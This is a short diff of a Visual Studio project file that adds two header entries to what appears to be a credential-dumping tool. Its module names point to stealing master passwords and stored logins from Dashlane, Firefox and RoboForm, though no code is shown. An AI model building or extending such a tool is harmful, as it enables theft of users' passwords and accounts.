@@ -166,6 +166,7 @@
     <ClInclude Include="headers\core\saveAllProc.h" />
     <ClInclude Include="headers\core\saveDump.h" />
     <ClInclude Include="headers\core\saveFile.h" />
+    <ClInclude Include="headers\core\saveFile2.h" />
     <ClInclude Include="headers\dashlane\getCredsdashlaneEntries.h" />
     <ClInclude Include="headers\dashlane\getCredsdashlaneMaster.h" />
     <ClInclude Include="headers\firefox\getCredsfirefox.h" />
@@ -189,6 +190,7 @@
     <ClInclude Include="headers\roboform\app\getCredsroboformapp3.h" />
     <ClInclude Include="headers\roboform\app\getCredsroboformapp.h" />
     <ClInclude Include="headers\roboform\app\getCredsroboformapp2.h" />
+    <ClInclude Include="headers\roboform\app\getCredsroboformapp4.h" />
     <ClInclude Include="headers\roboform\plugin\getCredsroboformplugin.h" />
   </ItemGroup>
   <ItemGroup>
